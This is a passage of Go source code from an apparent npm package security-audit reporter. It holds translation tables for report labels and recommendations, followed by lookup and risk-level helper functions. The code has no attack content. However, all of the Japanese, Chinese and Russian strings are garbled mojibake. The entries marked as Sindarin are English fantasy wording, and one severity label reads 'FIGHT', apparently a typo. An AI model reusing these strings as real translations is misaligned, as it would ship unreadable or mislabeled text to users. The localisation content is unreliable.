		"no_issues":          "ÂïèÈ°å„ÅØË¶ã„Å§„Åã„Çä„Åæ„Åõ„Çì„Åß„Åó„Åü„ÄÇ„Éë„ÉÉ„Ç±„Éº„Ç∏„ÅØÂÆâÂÖ®„Å™„Çà„ÅÜ„Åß„Åô„ÄÇ",
		"findings_summary":   "Ê§úÂá∫‰∫ãÈ†Ö„ÅÆÊ¶ÇË¶Å",
		"total_findings":     "ÂêàË®à: %d ‰ª∂„ÅÆÊ§úÂá∫ (%d ÂÄã„ÅÆ„Ç¢„Éä„É©„Ç§„Ç∂„ÉºÁµåÁî±)",
		"severity_critical":  "Ëá¥ÂëΩÁöÑ",
		"severity_high":      "È´ò",
		"severity_medium":    "‰∏≠",
		"severity_low":       "‰Ωé",
		"finding_plural":     "‰ª∂„ÅÆÊ§úÂá∫",
		"findings_plural":    "‰ª∂„ÅÆÊ§úÂá∫",
		"findings_count":     "%s Ê§úÂá∫‰∫ãÈ†Ö (%d)",
		"analyzer_label":     "„Ç¢„Éä„É©„Ç§„Ç∂„Éº: %s",
		"attack_scenario":    "ÊîªÊíÉ„Ç∑„Éä„É™„Ç™:",
		"remediation":        "‰øÆÊ≠£„Ç¢„Éâ„Éê„Ç§„Çπ:",
		"analyzer_breakdown": "„Ç¢„Éä„É©„Ç§„Ç∂„ÉºÂà•„ÅÆÂÜÖË®≥",
		"clean":              "ÂÆâÂÖ®",
		"recommendations":    "Êé®Â•®‰∫ãÈ†Ö",
		"rec_critical":       "ÂæπÂ∫ïÁöÑ„Å™ÊâãÂãïÁ¢∫Ë™ç„Å™„Åó„Å´„ÄÅ„Åì„ÅÆ„Éë„ÉÉ„Ç±„Éº„Ç∏„Çí„Ç§„É≥„Çπ„Éà„Éº„É´„Åó„Å™„ÅÑ„Åß„Åè„Å†„Åï„ÅÑ",
		"rec_moderate":       "„Ç§„É≥„Çπ„Éà„Éº„É´Ââç„Å´„ÄÅ„Åô„Åπ„Å¶„ÅÆ„ÄåÈ´ò„Äç„Åä„Çà„Å≥„ÄåËá¥ÂëΩÁöÑ„Äç„Å™Ê§úÂá∫‰∫ãÈ†Ö„ÇíÁ¢∫Ë™ç„Åó„Å¶„Åè„Å†„Åï„ÅÑ",
		"rec_scripts":        "--ignore-scripts „Çí‰ªò„Åë„Å¶„Ç§„É≥„Çπ„Éà„Éº„É´„Åó„ÄÅ„Çπ„ÇØ„É™„Éó„Éà„ÇíÊâãÂãï„ÅßÊ§úÊüª„Åó„Å¶„Åè„Å†„Åï„ÅÑ",
		"rec_typosquat":      "„Éë„ÉÉ„Ç±„Éº„Ç∏Âêç„ÅåÊ≠£„Åó„ÅÑ„ÅãÁ¢∫Ë™ç„Åó„Å¶„Åè„Å†„Åï„ÅÑ„ÄÇ„Çø„Ç§„Éù„Çπ„ÇØ„ÉØ„ÉÉ„ÉÜ„Ç£„É≥„Ç∞„ÅÆÂèØËÉΩÊÄß„Åå„ÅÇ„Çä„Åæ„Åô",
		"rec_vuln":           "Êñ∞„Åó„ÅÑ„Éê„Éº„Ç∏„Éß„É≥„ÅßËÑÜÂº±ÊÄß„Åå‰øÆÊ≠£„Åï„Çå„Å¶„ÅÑ„Çã„ÅãÁ¢∫Ë™ç„Åó„Å¶„Åè„Å†„Åï„ÅÑ",
		"rec_provenance":     "„Éì„É´„Éâ„ÅÆË®ºÊòéÔºàprovenanceÔºâ„Åå„ÅÇ„Çã„Éë„ÉÉ„Ç±„Éº„Ç∏„ÇíÂÑ™ÂÖà„Åó„Å¶„Åè„Å†„Åï„ÅÑ",
		"rec_deps":           "‰æùÂ≠òÈñ¢‰øÇ„ÉÑ„É™„ÉºÂÖ®‰Ωì„ÇíÁõ£Êüª„Åó„Å¶„Åè„Å†„Åï„ÅÑ",
		"rec_maintainer":     "„É°„É≥„ÉÜ„Éä„Éº„ÅÆË∫´ÂÖÉ„Å®„ÄÅÊúÄËøë„ÅÆÊâÄÊúâÊ®©ÁßªËª¢„Åå„Å™„ÅÑ„ÅãÁ¢∫Ë™ç„Åó„Å¶„Åè„Å†„Åï„ÅÑ",
		"rec_safe":           "Â§ß„Åç„Å™Êá∏Âøµ„ÅØ„ÅÇ„Çä„Åæ„Åõ„Çì„ÄÇ„Éë„ÉÉ„Ç±„Éº„Ç∏„ÅØÂÆâÂÖ®„Å´‰ΩøÁî®„Åß„Åç„Çã„Çà„ÅÜ„Åß„Åô",
		"audited_at":         "Áõ£ÊüªÊó•ÊôÇ: %s",
		"project_audit":      "„Éó„É≠„Ç∏„Çß„ÇØ„ÉàÁõ£Êüª: %s",
		"packages_audited":   "Áõ£ÊüªÊ∏à„Åø„Éë„ÉÉ„Ç±„Éº„Ç∏: %d",
		"severity_critical_short": "Èáç",
		"severity_high_short":     "È´ò",
		"severity_medium_short":   "‰∏≠",
		"severity_low_short":      "‰Ωé",
		"csv_severity":       "ÈáçË¶ÅÂ∫¶",
		"csv_analyzer":       "„Ç¢„Éä„É©„Ç§„Ç∂„Éº",
		"csv_title":          "„Çø„Ç§„Éà„É´",
		"csv_description":    "Ë™¨Êòé",
	},
	LangZH: {
		"title":              "npm ÂÆâÂÖ®ÂÆ°ËÆ°Êä•Âëä",
		"pkg_info":           "ÂåÖ‰ø°ÊÅØ",
		"package":            "ÂåÖÂêç",
		"license":            "ËÆ∏ÂèØËØÅ",
		"maintainers":        "Áª¥Êä§ËÄÖ",
		"repository":         "‰ª£Á†ÅÂ∫ì",
		"created":            "ÂàõÂª∫‰∫é",
		"versions":           "ÁâàÊú¨",
		"published":          "Â∑≤ÂèëÂ∏É",
		"dependencies":       "‰æùËµñÈ°π",
		"direct":             "Áõ¥Êé•",
		"install_scripts":    "ÂÆâË£ÖËÑöÊú¨",
		"scripts_yes":        "ÊòØ ‚Äî ÂÆâË£ÖÊó∂ËøêË°å‰ª£Á†Å",
		"scripts_none":       "Êó†",
		"risk_assessment":    "È£éÈô©ËØÑ‰º∞",
		"critical_risk":      "‰∏•ÈáçÈ£éÈô©",
		"moderate_risk":      "‰∏≠Â∫¶È£éÈô©",
		"elevated_risk":      "ÊΩúÂú®È£éÈô©",
		"low_risk":           "‰ΩéÈ£éÈô©",
		"score_label":        "ËØÑÂàÜ: %d / 100",
		"analyzer_errors":    "ÂàÜÊûêÂô®ÈîôËØØ",
		"no_issues":          "Êú™ÂèëÁé∞ÈóÆÈ¢ò„ÄÇËØ•ÂåÖÁúãËµ∑Êù•ÊòØÂÆâÂÖ®ÁöÑ„ÄÇ",
		"findings_summary":   "ÂèëÁé∞ÊëòË¶Å",
		"total_findings":     "ÊÄªËÆ°: Âú® %d ‰∏™ÂàÜÊûêÂô®‰∏≠ÂèëÁé∞ %d Â§ÑÈóÆÈ¢ò",
		"severity_critical":  "Á¥ßÊÄ•",
		"severity_high":      "È´ò",
		"severity_medium":    "‰∏≠",
		"severity_low":       "‰Ωé",
		"finding_plural":     "Â§ÑÂèëÁé∞",
		"findings_plural":    "Â§ÑÂèëÁé∞",
		"findings_count":     "%s ÂèëÁé∞ (%d)",
		"analyzer_label":     "ÂàÜÊûêÂô®: %s",
		"attack_scenario":    "ÊîªÂáªÂú∫ÊôØ:",
		"remediation":        "‰øÆÂ§çÂª∫ËÆÆ:",
		"analyzer_breakdown": "ÂàÜÊûêÂô®ËØ¶ÁªÜÁªüËÆ°",
		"clean":              "ÂÆâÂÖ®",
		"recommendations":    "Âª∫ËÆÆ",
		"rec_critical":       "Âú®ËøõË°åÂΩªÂ∫ïÁöÑÊâãÂä®ÂÆ°Êü•‰πãÂâçÔºåËØ∑ÂãøÂÆâË£ÖÊ≠§ÂåÖ",
		"rec_moderate":       "Âú®ÂÆâË£Ö‰πãÂâçÔºåËØ∑ÂÆ°Êü•ÊâÄÊúâ„ÄåÈ´ò„ÄçÂíå„ÄåÁ¥ßÊÄ•„ÄçÁ∫ßÂà´ÁöÑÂèëÁé∞",
		"rec_scripts":        "‰ΩøÁî® --ignore-scripts ËøõË°åÂÆâË£ÖÂπ∂ÊâãÂä®Ê£ÄÊü•ËÑöÊú¨",
		"rec_typosquat":      "ËØ∑Ê†∏ÂØπÂåÖÂêçÊòØÂê¶Ê≠£Á°Æ ‚Äî ËøôÁúãËµ∑Êù•ÂÉèÊòØÊãºÂÜôÊä¢Ê≥® (typosquat)",
		"rec_vuln":           "Ê£ÄÊü•ÊºèÊ¥ûÊòØÂê¶Âú®ËæÉÊñ∞ÁâàÊú¨‰∏≠ÂæóÂà∞‰øÆÂ§ç",
		"rec_provenance":     "‰ºòÂÖàÈÄâÊã©ÂÖ∑ÊúâÊûÑÂª∫Ê∫ØÊ∫ê (provenance) ÁöÑÂåÖ",
		"rec_deps":           "ÂÆ°ËÆ°ÂÆåÊï¥ÁöÑ‰æùËµñÊ†ë",
		"rec_maintainer":     "È™åËØÅÁª¥Êä§ËÄÖË∫´‰ªΩÂπ∂Ê£ÄÊü•ËøëÊúüÊòØÂê¶ÊúâÊâÄÊúâÊùÉËΩ¨Áßª",
		"rec_safe":           "Êó†ÈáçÂ§ßÈ£éÈô© ‚Äî ËØ•ÂåÖÂèØ‰ª•ÂÆâÂÖ®‰ΩøÁî®",
		"audited_at":         "ÂÆ°ËÆ°Êó∂Èó¥: %s",
		"project_audit":      "È°πÁõÆÂÆ°ËÆ°: %s",
		"packages_audited":   "Â∑≤ÂÆ°ËÆ°ÂåÖÊï∞: %d",
		"severity_critical_short": "ÊÄ•",
		"severity_high_short":     "È´ò",
		"severity_medium_short":   "‰∏≠",
		"severity_low_short":      "‰Ωé",
		"csv_severity":       "‰∏•ÈáçÁ®ãÂ∫¶",
		"csv_analyzer":       "ÂàÜÊûêÂô®",
		"csv_title":          "Ê†áÈ¢ò",
		"csv_description":    "ÊèèËø∞",
	},
	LangRU: {
		"title":              "–û—Ç—á–µ—Ç –æ –ø—Ä–æ–≤–µ—Ä–∫–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ npm",
		"pkg_info":           "–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–∞–∫–µ—Ç–µ",
		"package":            "–ü–∞–∫–µ—Ç",
		"license":            "–õ–∏—Ü–µ–Ω–∑–∏—è",
		"maintainers":        "–†–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∏",
		"repository":         "–†–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–π",
		"created":            "–°–æ–∑–¥–∞–Ω",
		"versions":           "–í–µ—Ä—Å–∏–∏",
		"published":          "–æ–ø—É–±–ª–∏–∫–æ–≤–∞–Ω–æ",
		"dependencies":       "–ó–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏",
		"direct":             "–ø—Ä—è–º—ã–µ",
		"install_scripts":    "–°–∫—Ä–∏–ø—Ç—ã —É—Å—Ç–∞–Ω–æ–≤–∫–∏",
		"scripts_yes":        "–î–ê ‚Äî –∑–∞–ø—É—Å–∫–∞–µ—Ç –∫–æ–¥ –ø—Ä–∏ —É—Å—Ç–∞–Ω–æ–≤–∫–µ",
		"scripts_none":       "–ù–µ—Ç",
		"risk_assessment":    "–û—Ü–µ–Ω–∫–∞ —Ä–∏—Å–∫–æ–≤",
		"critical_risk":      "–ö–†–ò–¢–ò–ß–ï–°–ö–ò–ô –†–ò–°–ö",
		"moderate_risk":      "–£–ú–ï–†–ï–ù–ù–´–ô –†–ò–°–ö",
		"elevated_risk":      "–ü–û–í–´–®–ï–ù–ù–´–ô –†–ò–°–ö",
		"low_risk":           "–ù–ò–ó–ö–ò–ô –†–ò–°–ö",
		"score_label":        "–ë–∞–ª–ª—ã: %d / 100",
		"analyzer_errors":    "–û—à–∏–±–∫–∏ –∞–Ω–∞–ª–∏–∑–∞—Ç–æ—Ä–æ–≤",
		"no_issues":          "–ü—Ä–æ–±–ª–µ–º –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–æ. –ü–∞–∫–µ—Ç –≤—ã–≥–ª—è–¥–∏—Ç –±–µ–∑–æ–ø–∞—Å–Ω—ã–º.",
		"findings_summary":   "–°–≤–æ–¥–∫–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤",
		"total_findings":     "–í—Å–µ–≥–æ: %d —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ –æ—Ç %d –∞–Ω–∞–ª–∏–∑–∞—Ç–æ—Ä–æ–≤",
		"severity_critical":  "–ö–†–ò–¢–ò–ß–ï–°–ö–ê–Ø",
		"severity_high":      "–í–´–°–û–ö–ê–Ø",
		"severity_medium":    "–°–†–ï–î–ù–Ø–Ø",
		"severity_low":       "–ù–ò–ó–ö–ê–Ø",
		"finding_plural":     "—Ä–µ–∑—É–ª—å—Ç–∞—Ç",
		"findings_plural":    "—Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤",
		"findings_count":     "–†–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ (%d): %s",
		"analyzer_label":     "–ê–Ω–∞–ª–∏–∑–∞—Ç–æ—Ä: %s",
		"attack_scenario":    "–°—Ü–µ–Ω–∞—Ä–∏–π –∞—Ç–∞–∫–∏:",
		"remediation":        "–°–æ–≤–µ—Ç –ø–æ —É—Å—Ç—Ä–∞–Ω–µ–Ω–∏—é:",
		"analyzer_breakdown": "–†–∞–∑–±–∏–≤–∫–∞ –ø–æ –∞–Ω–∞–ª–∏–∑–∞—Ç–æ—Ä–∞–º",
		"clean":              "—á–∏—Å—Ç–æ",
		"recommendations":    "–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏",
		"rec_critical":       "–ù–ï —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–π—Ç–µ —ç—Ç–æ—Ç –ø–∞–∫–µ—Ç –±–µ–∑ —Ç—â–∞—Ç–µ–ª—å–Ω–æ–π —Ä—É—á–Ω–æ–π –ø—Ä–æ–≤–µ—Ä–∫–∏",
		"rec_moderate":       "–ò–∑—É—á–∏—Ç–µ –≤—Å–µ –í–´–°–û–ö–ò–ï –∏ –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ï —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã –ø–µ—Ä–µ–¥ —É—Å—Ç–∞–Ω–æ–≤–∫–æ–π",
		"rec_scripts":        "–£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–π—Ç–µ —Å —Ñ–ª–∞–≥–æ–º --ignore-scripts –∏ –ø—Ä–æ–≤–µ—Ä—è–π—Ç–µ —Å–∫—Ä–∏–ø—Ç—ã –≤—Ä—É—á–Ω—É—é",
		"rec_typosquat":      "–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω–æ—Å—Ç—å –∏–º–µ–Ω–∏ –ø–∞–∫–µ—Ç–∞ ‚Äî –ø–æ—Ö–æ–∂–µ –Ω–∞ —Ç–∞–π–ø–æ—Å–∫–≤–æ—Ç—Ç–∏–Ω–≥",
		"rec_vuln":           "–ü—Ä–æ–≤–µ—Ä—å—Ç–µ, –∏—Å–ø—Ä–∞–≤–ª–µ–Ω—ã –ª–∏ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ –±–æ–ª–µ–µ –Ω–æ–≤–æ–π –≤–µ—Ä—Å–∏–∏",
		"rec_provenance":     "–ü—Ä–µ–¥–ø–æ—á–∏—Ç–∞–π—Ç–µ –ø–∞–∫–µ—Ç—ã —Å –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–Ω—ã–º –ø—Ä–æ–∏—Å—Ö–æ–∂–¥–µ–Ω–∏–µ–º —Å–±–æ—Ä–∫–∏",
		"rec_deps":           "–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø–æ–ª–Ω–æ–µ –¥–µ—Ä–µ–≤–æ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π",
		"rec_maintainer":     "–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ª–∏—á–Ω–æ—Å—Ç—å —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∞ –∏ –Ω–µ–¥–∞–≤–Ω–∏–µ —Å–º–µ–Ω—ã –≤–ª–∞–¥–µ–ª—å—Ü–∞",
		"rec_safe":           "–°–µ—Ä—å–µ–∑–Ω—ã—Ö –ø—Ä–æ–±–ª–µ–º –Ω–µ—Ç ‚Äî –ø–∞–∫–µ—Ç –≤—ã–≥–ª—è–¥–∏—Ç –±–µ–∑–æ–ø–∞—Å–Ω—ã–º",
		"audited_at":         "–ü—Ä–æ–≤–µ—Ä–µ–Ω–æ %s",
		"project_audit":      "–ê—É–¥–∏—Ç –ø—Ä–æ–µ–∫—Ç–∞: %s",
		"packages_audited":   "–ü—Ä–æ–≤–µ—Ä–µ–Ω–æ –ø–∞–∫–µ—Ç–æ–≤: %d",
		"severity_critical_short": "–ö",
		"severity_high_short":     "–í",
		"severity_medium_short":   "–°",
		"severity_low_short":      "–ù",
		"csv_severity":       "–í–∞–∂–Ω–æ—Å—Ç—å",
		"csv_analyzer":       "–ê–Ω–∞–ª–∏–∑–∞—Ç–æ—Ä",
		"csv_title":          "–ó–∞–≥–æ–ª–æ–≤–æ–∫",
		"csv_description":    "–û–ø–∏—Å–∞–Ω–∏–µ",
	},
	LangTLH: { // Klingon
		"title":              "npm QaD Qu' 'oH",
		"pkg_info":           "ghom De'",
		"package":            "ghom",
		"license":            "chaw'",
		"maintainers":        "valwI'pu'",
		"repository":         "polmeH Duj",
		"created":            "chenmoHlu'pu'",
		"versions":           "mI'mey",
		"published":          "lablu'pu'",
		"dependencies":       "ghommey ghotpu'",
		"direct":             "ruv",
		"install_scripts":    "mI' lulermeb",
		"scripts_yes":        "HIja' ‚Äî Qu' lulermeb",
		"scripts_none":       "pagh",
		"risk_assessment":    "Sura'meH Qu'",
		"critical_risk":      "Sura'qu' Qu'",
		"moderate_risk":      "Sura' Qu'",
		"elevated_risk":      "Sura'law' Qu'",
		"low_risk":           "Sura'be' Qu'",
		"score_label":        "mI': %d / 100",
		"analyzer_errors":    "Qu' lulermeb Qagh",
		"no_issues":          "Qagh pagh. ghom QaD.",
		"findings_summary":   "Qu' Sura' ghom",
		"total_findings":     "Hoch: %d Sura' %d Qu' lulermeb",
		"severity_critical":  "QIDqu'",
		"severity_high":      "QID",
		"severity_medium":    "Sura'",
		"severity_low":       "Sura'mach",
		"finding_plural":     "Sura'",
		"findings_plural":    "Sura'mey",
		"findings_count":     "%s Sura' (%d)",
		"analyzer_label":     "Qu' lulermeb: %s",
		"attack_scenario":    "ghob Scenario:",
		"remediation":        "qaD Advice:",
		"analyzer_breakdown": "Qu' lulermeb De'",
		"clean":              "QaD",
		"recommendations":    "recs",
		"rec_critical":       "yIlo'Qo'!",
		"rec_moderate":       "yIghoH!",
		"rec_scripts":        "yIghoH scripts!",
		"rec_typosquat":      "yIghoH name!",
		"rec_vuln":           "yIghoH vulnerabilities!",
		"rec_provenance":     "yIghoH provenance!",
		"rec_deps":           "yIghoH dependencies!",
		"rec_maintainer":     "yIghoH maintainers!",
		"rec_safe":           "QaD",
		"audited_at":         "Audited at %s",
		"project_audit":      "Project Audit: %s",
		"packages_audited":   "Packages Audited: %d",
		"severity_critical_short": "Q",
		"severity_high_short":     "H",
		"severity_medium_short":   "S",
		"severity_low_short":      "L",
		"csv_severity":       "Severity",
		"csv_analyzer":       "Analyzer",
		"csv_title":          "Title",
		"csv_description":    "Description",
	},
	LangVUL: { // Vulcan
		"title":              "npm Security Audit Logic",
		"pkg_info":           "Package Data",
		"package":            "Unit",
		"license":            "Agreement",
		"maintainers":        "Stewards",
		"repository":         "Repository",
		"created":            "Initial Epoch",
		"versions":           "Iterations",
		"published":          "manifested",
		"dependencies":       "Integrations",
		"direct":             "primary",
		"install_scripts":    "Execution Scripts",
		"scripts_yes":        "Affirmative ‚Äî logic executes on integration",
		"scripts_none":       "None",
		"risk_assessment":    "Probability Analysis",
		"critical_risk":      "ILLOGICAL RISK",
		"moderate_risk":      "SIGNIFICANT RISK",
		"elevated_risk":      "OBSERVABLE RISK",
		"low_risk":           "MINIMAL RISK",
		"score_label":        "Metric: %d / 100",
		"analyzer_errors":    "System Anomalies",
		"no_issues":          "No anomalies detected. Unit is logical.",
		"findings_summary":   "Data Summary",
		"total_findings":     "Total: %d observations across %d subsystems",
		"severity_critical":  "VITAL",
		"severity_high":      "HIGH",
		"severity_medium":    "MODERATE",
		"severity_low":       "NEGLIGIBLE",
		"finding_plural":     "observation",
		"findings_plural":    "observations",
		"findings_count":     "%s Observations (%d)",
		"analyzer_label":     "Subsystem: %s",
		"attack_scenario":    "Conflict Scenario:",
		"remediation":        "Corrective Action:",
		"analyzer_breakdown": "Subsystem Analysis",
		"clean":              "optimal",
		"recommendations":    "Logical Directives",
		"rec_critical":       "Integration is highly illogical and dangerous",
		"rec_moderate":       "Analyze vital and high observations before proceeding",
		"rec_scripts":        "Use --ignore-scripts to maintain system integrity",
		"rec_typosquat":      "Verify identity; name suggests deceptive intent",
		"rec_vuln":           "Assess newer iterations for vulnerability resolution",
		"rec_provenance":     "Prioritize units with verifiable origin",
		"rec_deps":           "Audit complete integration tree",
		"rec_maintainer":     "Verify steward credentials",
		"rec_safe":           "Integration is logical",
		"audited_at":         "Analyzed at %s",
		"project_audit":      "Project Logic Audit: %s",
		"packages_audited":   "Units Analyzed: %d",
		"severity_critical_short": "V",
		"severity_high_short":     "H",
		"severity_medium_short":   "M",
		"severity_low_short":      "N",
		"csv_severity":       "Severity",
		"csv_analyzer":       "Subsystem",
		"csv_title":          "Title",
		"csv_description":    "Description",
	},
	LangSIN: { // Sindarin (Elvish)
		"title":              "Report on the Safety of npm",
		"pkg_info":           "Knowledge of the Package",
		"package":            "Package",
		"license":            "Charter",
		"maintainers":        "Guardians",
		"repository":         "Vault of Lore",
		"created":            "Awakened",
		"versions":           "Cycles",
		"published":          "revealed",
		"dependencies":       "Alliances",
		"direct":             "kin",
		"install_scripts":    "Rites of Integration",
		"scripts_yes":        "Yes ‚Äî magic flows upon integration",
		"scripts_none":       "None",
		"risk_assessment":    "Omen Analysis",
		"critical_risk":      "DARK OMEN",
		"moderate_risk":      "TROUBLED OMEN",
		"elevated_risk":      "WARY OMEN",
		"low_risk":           "BRIGHT OMEN",
		"score_label":        "Measure: %d / 100",
		"analyzer_errors":    "Faded Visions",
		"no_issues":          "No darkness found. The path is clear.",
		"findings_summary":   "Summary of Omens",
		"total_findings":     "Total: %d omens across %d visions",
		"severity_critical":  "PERILOUS",
		"severity_high":      "SEVERE",
		"severity_medium":    "UNSETTLING",
		"severity_low":       "FIGHT",
		"finding_plural":     "omen",
		"findings_plural":    "omens",
		"findings_count":     "%s Omens (%d)",
		"analyzer_label":     "Vision: %s",
		"attack_scenario":    "Shadow Scenario:",
		"remediation":        "Healing Path:",
		"analyzer_breakdown": "Vision Breakdown",
		"clean":              "pure",
		"recommendations":    "Wise Counsel",
		"rec_critical":       "DO NOT bring this into your realm",
		"rec_moderate":       "Heed the perilous omens before integration",
		"rec_scripts":        "Integrate with care, ignoring the rites",
		"rec_typosquat":      "The name is a trick of the shadow",
		"rec_vuln":           "Seek a newer cycle where the flaw is healed",
		"rec_provenance":     "Prefer those with verifiable lineage",
		"rec_deps":           "Audit all alliances",
		"rec_maintainer":     "Verify the honor of the guardians",
		"rec_safe":           "The package is pure and safe to use",
		"audited_at":         "Envisioned at %s",
		"project_audit":      "Vault Audit: %s",
		"packages_audited":   "Packages Revealed: %d",
		"severity_critical_short": "P",
		"severity_high_short":     "S",
		"severity_medium_short":   "U",
		"severity_low_short":      "F",
		"csv_severity":       "Omen",
		"csv_analyzer":       "Vision",
		"csv_title":          "Title",
		"csv_description":    "Description",
	},
}

func (r *Reporter) T(key string, args ...interface{}) string {
	lang := r.lang
	if lang == "" {
		lang = LangEN
	}

	m, ok := translations[lang]
	if !ok {
		m = translations[LangEN]
	}

	val, ok := m[key]
	if !ok {
		// Fallback to English
		val, ok = translations[LangEN][key]
		if !ok {
			return key
		}
	}

	if len(args) > 0 {
		return fmt.Sprintf(val, args...)
	}
	return val
}

func (r *Reporter) GetSeverityLabel(s analyzer.Severity) string {
	switch s {
	case analyzer.SeverityCritical:
		return r.T("severity_critical")
	case analyzer.SeverityHigh:
		return r.T("severity_high")
	case analyzer.SeverityMedium:
		return r.T("severity_medium")
	case analyzer.SeverityLow:
		return r.T("severity_low")
	default:
		return s.String()
	}
}

func (r *Reporter) GetRiskLevel(score int) (string, string) {
	if score >= 70 {
		return colorRed, r.T("critical_risk")
	}
	if score >= 40 {
		return colorYellow, r.T("moderate_risk")
	}
	if score >= 20 {
		return colorBlue, r.T("elevated_risk")
	}
	return colorGreen, r.T("low_risk")
}